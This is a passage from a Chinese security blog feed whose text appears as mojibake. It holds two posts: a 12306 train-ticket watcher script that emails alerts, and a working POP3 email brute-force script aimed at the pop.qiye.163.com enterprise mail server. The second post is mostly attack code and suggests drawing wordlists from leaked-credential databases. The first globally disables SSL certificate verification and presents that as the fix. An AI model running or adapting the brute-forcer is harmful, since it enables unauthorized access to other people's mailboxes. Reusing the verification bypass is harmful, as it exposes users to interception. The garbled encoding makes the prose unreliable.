      <content type="html"><![CDATA[<p>ä»Šå¤©å‡†å¤‡ç»™å¸ˆå‚…ä¸€å—å»åº”æ€¥å“åº”ï¼Œç¥¨éƒ½å®šå¥½äº†ï¼Œå‘ç°å¿˜å¸¦èº«ä»½è¯äº†ï¼ŒMDZZâ€¦æ‰€ä»¥æˆ‘å°±è¿™æ ·é”™å¤±äº†ä¸€æ¬¡å®è´µçš„æœºä¼šâ€¦æ›´â„¢å¯æ¶çš„æ˜¯æˆ‘å»é€€ç¥¨ï¼Œç«Ÿç„¶ç»™æˆ‘è¯´æ²¡æœ‰èº«ä»½è¯é€€ä¸äº†ã€‚ã€‚ã€‚æˆ‘ç‰¹ä¹ˆçš„è¦æ˜¯æœ‰èº«ä»½è¯ï¼Œæˆ‘è¿˜é€€ä½ å¤§çˆ·å•Šã€‚ã€‚ã€‚</p>
<p>æ‰€ä»¥æƒ³æå®ƒï¼Œä¸€æƒ³ï¼Œç®—äº†ï¼Œå‡­æˆ‘è¿™æœ¬äº‹æ12306è¿˜æ˜¯åˆ«è£…é€¼ï¼Œæ‰€ä»¥å°±æœ‰äº†è¿™ä¸ªè„šæœ¬ã€‚ã€‚ã€‚<br><a id="more"></a><br>æºä»£ç å¦‚ä¸‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: UTF-8 -*-</div><div class="line">&apos;&apos;&apos;</div><div class="line">@Authorï¼šw2n1ck</div><div class="line">@åšå®¢ï¼šhttp://byd.dropsec.xyz/</div><div class="line">&apos;&apos;&apos;</div><div class="line">import urllib2</div><div class="line">import json</div><div class="line">import smtplib</div><div class="line">import time</div><div class="line">import codecs</div><div class="line">from email.mime.text import MIMEText</div><div class="line">import ssl</div><div class="line"></div><div class="line"># è®°å½•æ—¥å¿—</div><div class="line">def log(content):</div><div class="line">    t = time.strftime(&apos;%Y-%m-%d %H:%M:%S&apos;)</div><div class="line">    f = codecs.open(&apos;watcher.log&apos;, &apos;a&apos;, &apos;utf-8&apos;)</div><div class="line">    f.write(&apos;[%s]%s\n&apos; % (t, content))</div><div class="line">    f.close()</div><div class="line"></div><div class="line"># å‘é€é‚®ä»¶</div><div class="line">def send_mail(content):</div><div class="line">    to_list=[&apos;xxx@qq.com&apos;] </div><div class="line">    mail_host = &apos;smtp.163.com&apos; </div><div class="line">    mail_user = &apos;xxx&apos; </div><div class="line">    mail_pass = &apos;xxx&apos;   </div><div class="line">    mail_postfix = &apos;163.com&apos; </div><div class="line">    me = &quot;TicketsWatcher&quot;+&quot;&lt;&quot;+mail_user+&quot;@&quot;+mail_postfix+&quot;&gt;&quot;</div><div class="line">    msg = MIMEText(content,_subtype=&apos;plain&apos;,_charset=&apos;gb2312&apos;)</div><div class="line">    msg[&apos;Subject&apos;] = &apos;There are some tickets you need.&apos;</div><div class="line">    msg[&apos;From&apos;] = me</div><div class="line">    msg[&apos;To&apos;] = &quot;;&quot;.join(to_list)</div><div class="line">    server = smtplib.SMTP()</div><div class="line">    server.connect(mail_host)</div><div class="line">    server.ehlo()</div><div class="line">    server.starttls()</div><div class="line">    server.login(mail_user,mail_pass)</div><div class="line">    server.sendmail(me, to_list, msg.as_string())</div><div class="line">    server.close()</div><div class="line">    log(&apos;sent mail successfully&apos;)</div><div class="line"></div><div class="line">try:</div><div class="line">    # è¯·æ±‚åœ°å€æ ¹æ®å®é™…è¦æŠ“å–çš„é¡µé¢ä¿®æ”¹ï¼Œå‚æ•°åŒ…æ‹¬æ—¥æœŸã€å‡ºå‘ç«™ã€åˆ°è¾¾ç«™</div><div class="line">    ssl._create_default_https_context = ssl._create_unverified_context</div><div class="line">    resp = urllib2.urlopen(&quot;https://kyfw.12306.cn/otn/lcxxcx/query?purpose_codes=ADULT&amp;queryDate=2016-10-11&amp;from_station=NJH&amp;to_station=SHH&quot;)</div><div class="line">    #print resp</div><div class="line">    result = resp.read()</div><div class="line">    #print result</div><div class="line">    data = json.loads(result)</div><div class="line">    datas = data[&apos;data&apos;][&apos;datas&apos;]</div><div class="line">    print datas</div><div class="line">    for d in datas:</div><div class="line">        if d[&apos;station_train_code&apos;] == &apos;T135&apos;:  </div><div class="line">            content = &apos;tickes for hard seat of %s: %s&apos; % (d[&apos;station_train_code&apos;], d[&apos;yz_num&apos;])</div><div class="line">            log(content)</div><div class="line">            if unicode(d[&apos;yz_num&apos;]) != u&quot;æ— &quot;:</div><div class="line">                send_mail(content)  </div><div class="line">            break</div><div class="line">except Exception, e:</div><div class="line">    content = &apos;somethings wrong with the program:\n&apos; + str(e)</div><div class="line">    log(content)</div><div class="line">    send_mail(content)</div></pre></td></tr></table></figure></p>
<p><strong>æµ‹è¯•ç»“æœï¼š</strong><br><img src="http://oa8y5guqs.bkt.clouddn.com/12306_1.png" alt=""><br><img src="http://oa8y5guqs.bkt.clouddn.com/12306_2.png" alt=""><br><strong>è¯´æ˜ï¼š</strong></p>
<p>è„šæœ¬åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼š</p>
<ul>
<li>è®°å½•æ—¥å¿—</li>
<li>å‘é€é‚®ä»¶</li>
<li>è½¦ç¥¨ä¿¡æ¯æ•æ‰</li>
</ul>
<p>è®°å½•æ—¥å¿—ä¼šåœ¨è„šæœ¬ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ª<code>watch.log</code>æ–‡ä»¶ï¼Œè¿™ä¸ªä¸»è¦æ˜¯å¾—ç»“åˆå®æ—¶æ•æ‰æ•°æ®ï¼Œä½ å¯ä»¥å®šæ—¶ä¹Ÿå¯ä»¥ä½¿ç”¨<code>crontab</code>,è¿™é‡Œæˆ‘å°±æ²¡åœ¨åŠ äº†(è¿˜æœ‰åä¸ªç½‘ç«™æ²¡æµ‹å‘¢ï¼Œæ”¿åºœç½‘ç«™çœŸæ˜¯å°¼ç›å•Šï¼Œè°æœ‰æ¯”è¾ƒå¥½çš„ç»éªŒæœ›å¤§ç‰›ä»¬ä¸ååˆ†äº«ï¼Œä¸è¯´äº†éƒ½æ˜¯æ³ªâ€¦)</p>
<p>å‘é€é‚®ä»¶éƒ¨åˆ†ä¸»è¦ç”¨äº†<code>smtplibå’Œemail</code>åº“ï¼Œå…·ä½“ä»£ç ä¸ºï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">to_list=[&apos;xxx@qq.com&apos;] 			#æ¥æ”¶é€šçŸ¥çš„é‚®ç®±</div><div class="line">mail_host = &apos;smtp.163.com&apos; 		#è®¾ç½®æœåŠ¡å™¨</div><div class="line">mail_user = &apos;xxx&apos; 				#æ›¿æ¢ä¸ºå‘ä»¶é‚®ç®±ç”¨æˆ·å,ä¸å¸¦@åé¢çš„</div><div class="line">mail_pass = &apos;xxx&apos;  				#æ›¿æ¢ä¸ºå‘ä»¶é‚®ç®±å£ä»¤</div><div class="line">mail_postfix = &apos;163.com&apos;  		#å‘ä»¶ç®±çš„åç¼€</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msg = MIMEText(content,_subtype=&apos;plain&apos;,_charset=&apos;gb2312&apos;)</div></pre></td></tr></table></figure>
<p>ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯é‚®ä»¶æ­£æ–‡ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯MIMEçš„subtypeï¼Œä¼ å…¥â€™plainâ€™ï¼Œæœ€ç»ˆçš„MIMEå°±æ˜¯â€™text/plainâ€™ï¼Œæœ€åè®¾ç½®ç¼–ç ä¸ºgb2312ï¼Œä¸è¿‡ä¸ºäº†å…¼å®¹æ€§ï¼Œä½ å¯ä»¥ä½¿ç”¨<code>utf-8</code>ï¼Œå…·ä½“çš„è¿‡ç¨‹å‡½æ•°æˆ‘å°±ä¸è§£é‡Šäº†ã€‚</p>
<p>ä¿¡æ¯æŠ“å–éƒ¨åˆ†ï¼Œå¾ˆç®€å•å°±æ˜¯æŠŠæ•°æ®å˜ä¸ºæ•°ç»„ï¼Œä»æ•°ç»„ä¸­åŒ¹é…ä¿¡æ¯ã€‚è¿™é‡Œæˆ‘é‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼š<code>urllib2.URLError: &lt;urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:590)&gt;</code><br>è¿™ä¸ªé”™è¯¯ä¿¡æ¯ä¸»è¦æ˜¯å› ä¸ºï¼š<code>SSL: CERTIFICATE_VERIFY_FAILED</code>Python å‡çº§åˆ° 2.7.9 ä¹‹åå¼•å…¥äº†ä¸€ä¸ªæ–°ç‰¹æ€§ï¼Œå½“ä½¿ç”¨urllib.urlopenæ‰“å¼€ä¸€ä¸ª https é“¾æ¥æ—¶ï¼Œä¼šéªŒè¯ä¸€æ¬¡ SSL è¯ä¹¦ã€‚è€Œå½“ç›®æ ‡ç½‘ç«™ä½¿ç”¨çš„æ˜¯è‡ªç­¾åçš„è¯ä¹¦æ—¶å°±ä¼šæŠ›å‡ºä¸€ä¸ª urllib2.URLError: çš„é”™è¯¯æ¶ˆæ¯.</p>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">import ssl</div><div class="line">import urllib2</div><div class="line">ssl._create_default_https_context = ssl._create_unverified_context</div><div class="line">print urllib2.urlopen(&quot;https://www.111cn.net/&quot;).read()</div></pre></td></tr></table></figure></p>
<p><strong>é™„ï¼š</strong></p>
<p><strong>smtpåè®®çš„åŸºæœ¬å‘½ä»¤åŒ…æ‹¬ï¼š</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">HELO å‘æœåŠ¡å™¨æ ‡è¯†ç”¨æˆ·èº«ä»½</div><div class="line">MAIL åˆå§‹åŒ–é‚®ä»¶ä¼ è¾“ mail from:</div><div class="line">RCPT æ ‡è¯†å•ä¸ªçš„é‚®ä»¶æ¥æ”¶äººï¼›å¸¸åœ¨MAILå‘½ä»¤åé¢,å¯æœ‰å¤šä¸ªrcpt  to:</div><div class="line">DATA åœ¨å•ä¸ªæˆ–å¤šä¸ªRCPTå‘½ä»¤å,è¡¨ç¤ºæ‰€æœ‰çš„é‚®ä»¶æ¥æ”¶äººå·²æ ‡è¯†,å¹¶åˆå§‹åŒ–æ•°æ®ä¼ è¾“,ä»¥.ç»“æŸ</div><div class="line">VRFY ç”¨äºéªŒè¯æŒ‡å®šçš„ç”¨æˆ·/é‚®ç®±æ˜¯å¦å­˜åœ¨ï¼›ç”±äºå®‰å…¨æ–¹é¢çš„åŸå› ,æœåŠ¡å™¨å¸¸ç¦æ­¢æ­¤å‘½ä»¤</div><div class="line">EXPN éªŒè¯ç»™å®šçš„é‚®ç®±åˆ—è¡¨æ˜¯å¦å­˜åœ¨,æ‰©å……é‚®ç®±åˆ—è¡¨,ä¹Ÿå¸¸è¢«ç¦ç”¨</div><div class="line">HELP æŸ¥è¯¢æœåŠ¡å™¨æ”¯æŒä»€ä¹ˆå‘½ä»¤</div><div class="line">NOOP æ— æ“ä½œ,æœåŠ¡å™¨åº”å“åº”OK</div><div class="line">QUIT ç»“æŸä¼šè¯</div><div class="line">RSET é‡ç½®ä¼šè¯,å½“å‰ä¼ è¾“è¢«å–æ¶ˆ</div><div class="line">MAIL FROM æŒ‡å®šå‘é€è€…åœ°å€</div><div class="line">RCPT TO æŒ‡æ˜çš„æ¥æ”¶è€…åœ°å€</div></pre></td></tr></table></figure></p>
<p><strong>SMTPä¼šè¯çš„æµç¨‹ï¼š</strong></p>
<ol>
<li>ehlo</li>
<li>auth login</li>
<li>mail from</li>
<li>rcpt to</li>
<li>data</li>
<li>quit</li>
</ol>
<p>ä¸Šé¢è¯´çš„æ˜¯æœ€æ™®é€šçš„æƒ…å†µï¼Œä½†æ˜¯ç°åœ¨å¥½å¤šä¼ä¸šé‚®ä»¶éƒ½æ˜¯å®‰å…¨é‚®ä»¶çš„ï¼Œå°±æ˜¯é€šè¿‡SSLå‘é€çš„é‚®ä»¶ï¼Œè¿™ä¸ªæ€ä¹ˆå‘å‘¢ï¼ŸSMTPå¯¹SSLå®‰å…¨é‚®ä»¶çš„æ”¯æŒæœ‰ä¸¤ç§æ–¹æ¡ˆï¼Œä¸€ç§è€çš„æ˜¯ä¸“é—¨å¼€å¯ä¸€ä¸ª465ç«¯å£æ¥æ¥æ”¶sslé‚®ä»¶ï¼Œå¦ä¸€ç§æ›´æ–°çš„åšæ³•æ˜¯åœ¨æ ‡å‡†çš„25ç«¯å£çš„smtpä¸Šå¢åŠ ä¸€ä¸ª<code>starttls</code>çš„å‘½ä»¤æ¥æ”¯æŒã€‚</p>
<p>è¿™ä¸ªå¾ˆç®€å•ï¼Œ<code>smtplib</code>é‡Œå°±æœ‰è¿™ä¸ªæ–¹æ³•ï¼Œå«<code>smtplib.starttls()</code>ã€‚å½“ç„¶ï¼Œä¸æ˜¯æ‰€æœ‰çš„é‚®ä»¶ç³»ç»Ÿéƒ½æ”¯æŒå®‰å…¨é‚®ä»¶çš„ï¼Œè¿™ä¸ªéœ€è¦ä»<code>ehlo</code>çš„è¿”å›å€¼é‡Œæ¥ç¡®è®¤ï¼Œå¦‚æœé‡Œé¢æœ‰<code>starttls</code>ï¼Œæ‰è¡¨ç¤ºæ”¯æŒã€‚</p>
<p><strong>æ³¨æ„ï¼š</strong><br>ä»¥ä¸Šçš„ä»£ç ä¸ºäº†æ–¹ä¾¿æˆ‘éƒ½æ²¡æœ‰åˆ¤æ–­è¿”å›å€¼ï¼Œä¸¥æ ¼è¯´æ¥ï¼Œæ˜¯åº”è¯¥åˆ¤æ–­ä¸€ä¸‹è¿”å›çš„ä»£ç çš„ï¼Œåœ¨smtpåè®®ä¸­ï¼Œåªæœ‰è¿”å›ä»£ç æ˜¯2xxæˆ–è€…3xxæ‰èƒ½ç»§ç»­ä¸‹ä¸€æ­¥ï¼Œè¿”å›4xxæˆ–5xxçš„ï¼Œéƒ½æ˜¯å‡ºé”™äº†ã€‚</p>
]]></content>
      
        
        <tags>
            
            <tag> ç¼–ç¨‹ </tag>
            
            <tag> Python </tag>
            
            <tag> è‡ªåŠ¨åŒ– </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python é‚®ç®±çˆ†ç ´]]></title>
      <url>/2016/10/03/Python-%E9%82%AE%E7%AE%B1%E7%88%86%E7%A0%B4/</url>
      <content type="html"><![CDATA[<p>æŒ‰ç…§å¸ˆå‚…ç»™çš„ä»»åŠ¡ï¼Œå†™äº†ä¸€ä¸ªä¼ä¸šé‚®ç®±çš„çˆ†ç ´è„šæœ¬ï¼Œåç»­è¿˜æœ‰FTP,SSHç­‰ä¸€äº›çˆ†ç ´çš„è„šæœ¬ã€‚</p>
<p>æˆ‘å…ˆè¯´ä¸‹æ•´ä½“æ€è·¯ï¼š</p>
<p>æ€»ä½“å°±æ˜¯åˆ©ç”¨pythonçš„poplibæ¨¡å—æ¥ä»pop3æœåŠ¡å™¨ä¸Šäº¤äº’ï¼Œæ ¹æ®è·å–çš„ç›¸å…³ä¿¡æ¯ï¼Œäº§ç”Ÿç»“æœã€‚POP3åè®®å¹¶ä¸å¤æ‚ï¼Œå®ƒä¹Ÿæ˜¯é‡‡ç”¨çš„ä¸€é—®ä¸€ç­”å¼çš„æ–¹å¼ï¼Œä½ å‘æœåŠ¡å™¨å‘é€ä¸€ä¸ªå‘½ä»¤ï¼ŒæœåŠ¡å™¨å¿…ç„¶ä¼šå›å¤ä¸€ä¸ªä¿¡æ¯.<br><a id="more"></a></p>
<ol>
<li>é¦–å…ˆéªŒè¯å‚æ•°æ˜¯å¦æ­£ç¡®<br>Sys.argv[]æ˜¯ç”¨æ¥è·å–å‘½ä»¤è¡Œå‚æ•°çš„ï¼Œsys.argv[0]è¡¨ç¤ºä»£ç æœ¬èº«æ–‡ä»¶è·¯å¾„ï¼Œæ‰€ä»¥å‚æ•°ä»1å¼€å§‹</li>
<li>ç„¶åä»ç”¨æˆ·å¯†ç æ–‡ä»¶ä¸­è¯»å–ä¿¡æ¯</li>
<li>pop.getwelcome()ç”¨æ¥è·å–è¿æ¥æœåŠ¡å™¨çš„å“åº”çŠ¶æ€</li>
<li><p>ç„¶åå°±æ˜¯è„šæœ¬çš„æ ¸å¿ƒä»£ç éƒ¨åˆ†</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">server = &quot;pop.qiye.163.com&quot; 	//è®¾ç½®pop3æœåŠ¡å™¨åœ°å€</div><div class="line">pop = poplib.POP3(server,110) 	//è¿æ¥pop3æœåŠ¡å™¨</div><div class="line">pop.user(user) 			//éªŒè¯ç”¨æˆ·å</div><div class="line">auth = pop.pass_(passwd) 	//éªŒè¯å¯†ç </div><div class="line">if auth.split(&apos; &apos;)[0]== &quot;+OK&quot;: 	//åˆ¤æ–­å“åº”çš„ç»“æœæ˜¯å¦â€œOKâ€</div><div class="line">    pring user,passwd</div></pre></td></tr></table></figure>
</li>
<li><p>æœ€åè¾“å‡ºå‡ºæ¥ç›¸å…³çš„ç”¨æˆ·ä¿¡æ¯</p>
</li>
</ol>
<p>è„šæœ¬ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: UTF-8 -*-</div><div class="line">&apos;&apos;&apos;</div><div class="line">@Authorï¼šw2n1ck</div><div class="line">@åšå®¢ï¼šhttp://byd.dropsec.xyz/</div><div class="line">@Email Pop3 Brute Forcer</div><div class="line">&apos;&apos;&apos;</div><div class="line"></div><div class="line">import threading, time, random, sys, poplib</div><div class="line">from copy import copy</div><div class="line"></div><div class="line">if len(sys.argv) !=3:</div><div class="line">  print &quot;\t   --------------------------------------------------\n&quot;</div><div class="line">  print &quot;\t    Usage: ./Emailpopbrute.py &lt;userlist&gt; &lt;passlist&gt;\n&quot;</div><div class="line">  sys.exit(1)</div><div class="line"></div><div class="line">server = &quot;pop.qiye.163.com&quot;</div><div class="line">success = []</div><div class="line"></div><div class="line">try:</div><div class="line">    users = open(sys.argv[1], &quot;r&quot;).readlines()</div><div class="line">except(IOError):</div><div class="line">    print &quot;[-] Error: urerlistæ‰“å¼€å¤±è´¥!\n&quot;</div><div class="line">    sys.exit(1)</div><div class="line"></div><div class="line">try:</div><div class="line">    words = open(sys.argv[2], &quot;r&quot;).readlines()</div><div class="line">except(IOError):</div><div class="line">    print &quot;[-] Error: passlistæ‰“å¼€å¤±è´¥!\n&quot;</div><div class="line">    sys.exit(1)</div><div class="line">try:</div><div class="line">  pop = poplib.POP3(server,110)</div><div class="line">  welcome = pop.getwelcome()</div><div class="line">  print welcome</div><div class="line">  pop.quit()</div><div class="line">except (poplib.error_proto):</div><div class="line">  welcome = &quot;No Response&quot;</div><div class="line">  pass</div><div class="line"></div><div class="line">def mailbruteforce(listuser,listpwd):</div><div class="line">  if len(listuser) &lt; 1 or len(listpwd) &lt; 1 :</div><div class="line">    print &quot;An error occurred: No user or pass list&quot;</div><div class="line">    return 1</div><div class="line">  for user in listuser:</div><div class="line">    for value in listpwd :</div><div class="line">      user = user.replace(&quot;\n&quot;,&quot;&quot;)</div><div class="line">      value = value.replace(&quot;\n&quot;,&quot;&quot;)</div><div class="line">      try:</div><div class="line">        print &quot;-&quot;*12</div><div class="line">        print &quot;[+] User:&quot;,user,&quot;Password:&quot;,value</div><div class="line">        time.sleep(1)</div><div class="line">        pop = poplib.POP3(server,110)</div><div class="line">        pop.user(user)</div><div class="line">        auth = pop.pass_(value)</div><div class="line">        print auth</div><div class="line">        if auth.split(&apos; &apos;)[0]!= &quot;+OK&quot; :</div><div class="line">          pop.quit()</div><div class="line">          print &quot;unknown error !&quot;</div><div class="line">          continue</div><div class="line">        if pop.stat()[1] is None or pop.stat()[1] &lt; 1 :</div><div class="line">          pop.quit()</div><div class="line">          print &quot;è·å–ä¿¡æ¯å¤±è´¥!&quot;</div><div class="line">          continue</div><div class="line">        ret = (user,value,pop.stat()[0],pop.stat()[1])</div><div class="line">        success.append(ret)</div><div class="line">        pop.quit()</div><div class="line">        break</div><div class="line">      except:</div><div class="line">        #print &quot;An error occurred:&quot;, msg</div><div class="line">        pass</div><div class="line">print &quot;\t   --------------------------------------------------\n&quot;</div><div class="line">print &quot;[+] Server:&quot;,server</div><div class="line">print &quot;[+] Port: 995&quot;</div><div class="line">print &quot;[+] Users Loaded:&quot;,len(users)</div><div class="line">print &quot;[+] Words Loaded:&quot;,len(words)</div><div class="line">print &quot;[+] Server response:&quot;,welcome,&quot;\n&quot;</div><div class="line">mailbruteforce(users,words)</div><div class="line"></div><div class="line">print &quot;\t[+] have weakpass :\t&quot;,len(success)</div><div class="line">if len(success) &gt;=1:</div><div class="line">  for ret in success:</div><div class="line">    print &quot;\n\n[+] Login successful:&quot;,ret[0], ret[1]</div><div class="line">    print &quot;\t[+] Mail:&quot;,ret[2],&quot;emails&quot;</div><div class="line">    print &quot;\t[+] Size:&quot;,ret[3],&quot;bytes\n&quot;</div><div class="line">print &quot;\n[-] Done&quot;</div></pre></td></tr></table></figure>
<p>æµ‹è¯•ç»“æœï¼š</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/163.png" alt=""></p>
<p><strong>è¯´æ˜ï¼š</strong><br>ç”¨æˆ·å­—å…¸æ–‡ä»¶éœ€è¦@domain.comï¼Œç±»ä¼¼zhangsan@domain.comã€lisi@domain.comã€wangwu@domain.comè¿™æ ·çš„ã€‚ç”±äºæˆ‘ä¹Ÿæ²¡æœ‰ä¼ä¸šé‚®ç®±çš„è´¦å·å¯†ç ï¼Œä¹Ÿå°±æ²¡æµ‹è¯•æˆåŠŸçš„ï¼Œè¦æ˜¯æ„Ÿå…´è¶£ï¼Œå¯ä»¥æœä¸€ä¸‹ç›¸å…³ç¤¾å·¥è£¤ã€‚</p>
<p><strong>é™„ï¼š</strong></p>
<p><strong>python ä¸­ os._exit()ï¼Œ sys.exit()ï¼Œ exit() çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<ol>
<li>sys.exit(n) é€€å‡ºç¨‹åºå¼•å‘ä¸€ä¸ªSystemExitå¼‚å¸¸, å¯ä»¥æ•è·å¼‚å¸¸æ‰§è¡Œäº›æ¸…ç†å·¥ä½œ. né»˜è®¤å€¼ä¸º0, è¡¨ç¤ºæ­£å¸¸é€€å‡º. å…¶ä»–éƒ½æ˜¯éæ­£å¸¸é€€å‡º. æ²¡æœ‰æ•è·è¿™ä¸ªå¼‚å¸¸ï¼Œä¼šç›´æ¥é€€å‡ºï¼›æ•è·è¿™ä¸ªå¼‚å¸¸å¯ä»¥åšä¸€äº›é¢å¤–çš„æ¸…ç†å·¥ä½œã€‚ ä¸€èˆ¬ä¸»ç¨‹åºä¸­ä½¿ç”¨æ­¤é€€å‡º</li>
<li>os._exit(n), ç›´æ¥é€€å‡º Python è§£é‡Šå™¨ï¼Œå…¶åçš„ä»£ç éƒ½ä¸æ‰§è¡Œ, ä¸æŠ›å¼‚å¸¸, ä¸æ‰§è¡Œç›¸å…³æ¸…ç†å·¥ä½œ. å¸¸ç”¨åœ¨å­è¿›ç¨‹çš„é€€å‡º.</li>
<li>exit() è·Ÿ C è¯­è¨€ç­‰å…¶ä»–è¯­è¨€çš„ exit() åº”è¯¥æ˜¯ä¸€æ ·çš„</li>
</ol>
<p><strong>pop3æ”¶å–é‚®ä»¶çš„è¿‡ç¨‹ä¸€èˆ¬æ˜¯:</strong></p>
<ol>
<li>è¿æ¥pop3æœåŠ¡å™¨ (poplib.POP3.__init__)</li>
<li>å‘é€ç”¨æˆ·åå’Œå¯†ç è¿›è¡ŒéªŒè¯ (poplib.POP3.user poplib.POP3.pass_)</li>
<li>è·å–é‚®ç®±ä¸­ä¿¡ä»¶ä¿¡æ¯ (poplib.POP3.stat)</li>
<li>æ”¶å–é‚®ä»¶ (poplib.POP3.retr)</li>
<li>åˆ é™¤é‚®ä»¶ (poplib.POP3.dele)</li>
<li>é€€å‡º (poplib.POP3.quit)</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">å‘½ä»¤ã€€poplibæ–¹æ³•ã€€ã€€ã€€ã€€å‚æ•°ã€€ã€€ã€€  çŠ¶æ€ã€€ã€€ã€€ã€€ã€€æè¿°</div><div class="line">-----------------------------------------------------------------------------------------------</div><div class="line">USERã€€ã€€user  ã€€  usernameã€€ã€€è®¤å¯ã€€ã€€ç”¨æˆ·åï¼Œæ­¤å‘½ä»¤ä¸ä¸‹é¢çš„passå‘½ä»¤è‹¥æˆåŠŸï¼Œå°†å¯¼è‡´çŠ¶æ€è½¬æ¢</div><div class="line">PASSã€€ã€€pass_ ã€€ã€€passwordã€€ã€€è®¤å¯ã€€ã€€ç”¨æˆ·å¯†ç ã€€ã€€ã€€</div><div class="line">APOPã€€ã€€apopã€€ã€€ã€€Name,Digest è®¤å¯ã€€  Digestæ˜¯MD5æ¶ˆæ¯æ‘˜è¦</div><div class="line">-----------------------------------------------------------------------------------------------</div><div class="line">STATã€€ã€€stat  ã€€ã€€Noneã€€ã€€ã€€  å¤„ç†ã€€ã€€è¯·æ±‚æœåŠ¡å™¨å‘å›å…³äºé‚®ç®±çš„ç»Ÿè®¡èµ„æ–™ï¼Œå¦‚é‚®ä»¶æ€»æ•°å’Œæ€»å­—èŠ‚æ•°</div><div class="line">UIDLã€€ã€€uidlã€€ã€€ã€€[Msg#]ã€€ã€€  å¤„ç†ã€€ã€€è¿”å›é‚®ä»¶çš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼ŒPOP3ä¼šè¯çš„æ¯ä¸ªæ ‡è¯†ç¬¦éƒ½å°†æ˜¯å”¯ä¸€çš„</div><div class="line">LISTã€€ã€€listã€€ã€€ã€€[Msg#]ã€€ã€€  å¤„ç†ã€€ã€€è¿”å›é‚®ä»¶æ•°é‡å’Œæ¯ä¸ªé‚®ä»¶çš„å¤§å°</div><div class="line">RETRã€€ã€€retrã€€ã€€ã€€[Msg#]ã€€    å¤„ç†ã€€ã€€è¿”å›ç”±å‚æ•°æ 